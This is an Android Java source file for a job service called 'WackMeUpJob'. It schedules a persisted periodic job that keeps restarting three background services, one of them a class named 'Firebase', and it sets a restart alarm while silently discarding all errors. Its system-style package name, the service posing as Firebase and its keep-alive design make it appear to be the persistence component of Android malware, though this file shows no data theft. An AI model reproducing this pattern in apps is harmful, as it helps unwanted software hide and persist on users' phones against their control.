package com.android.pictach;

import android.app.job.JobInfo;
import android.app.job.JobParameters;
import android.app.job.JobScheduler;
import android.app.job.JobService;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import java.lang.ref.WeakReference;

public class WackMeUpJob extends JobService {

    public static volatile long lastScheduledAt;
    public static final int JOB_ID_1 = 8888;
    public static final int JOB_ID_2 = 8889;
    public Handler handler;

    public static class JobRunnable implements Runnable {

        public final WeakReference<WackMeUpJob> jobRef;
        public final JobParameters params;

        public JobRunnable(WackMeUpJob job, JobParameters params) {
            this.jobRef = new WeakReference<>(job);
            this.params = params;
        }

        @Override
        public void run() {
            WackMeUpJob job = this.jobRef.get();
            if (job != null) {
                try {
                    job.startPersistentServices();
                    job.jobFinished(this.params, false);
                } catch (Exception unused) {
                    job.jobFinished(this.params, true);
                }
            }
        }
    }

    public static void scheduleJob(Context context) {
        long now = System.currentTimeMillis();
        if (now - lastScheduledAt < 60000) {
            return;
        }
        lastScheduledAt = now;
        try {
            JobScheduler jobScheduler = (JobScheduler) context.getSystemService("jobscheduler");
            if (jobScheduler == null) return;
            jobScheduler.cancel(JOB_ID_1);
            jobScheduler.cancel(JOB_ID_2);
            JobInfo.Builder builder = new JobInfo.Builder(
                    JOB_ID_1,
                    new ComponentName(context, WackMeUpJob.class)
            ).setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY).setPersisted(true);
            if (Build.VERSION.SDK_INT >= 24) {
                builder.setPeriodic(900000L, 300000L);
            } else {
                builder.setPeriodic(900000L);
            }
            jobScheduler.schedule(builder.build());
        } catch (Exception unused) {
        }
    }

    public final void startPersistentServices() {
        try {
            Intent i = new Intent(this, WorkerService.class);
            if (Build.VERSION.SDK_INT >= 26) {
                startForegroundService(i);
            } else {
                startService(i);
            }
        } catch (Exception unused) {
        }
        try {
            Intent i = new Intent(this, MyWorkerService.class);
            if (Build.VERSION.SDK_INT >= 26) {
                startForegroundService(i);
            } else {
                startService(i);
            }
        } catch (Exception unused) {
        }
        try {
            Intent i = new Intent(this, Firebase.class);
            if (Build.VERSION.SDK_INT >= 26) {
                startForegroundService(i);
            } else {
                startService(i);
            }
        } catch (Exception unused) {
        }
        try {
            Utils.scheduleRestartAlarm(getApplicationContext(), "Error", 60000L);
        } catch (Exception unused) {
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        this.handler = new Handler(Looper.getMainLooper());
    }

    @Override
    public boolean onStartJob(JobParameters params) {
        this.handler.postDelayed(new JobRunnable(this, params), 2000L);
        return true;
    }

    @Override
    public boolean onStopJob(JobParameters params) {
        return true;
    }
}
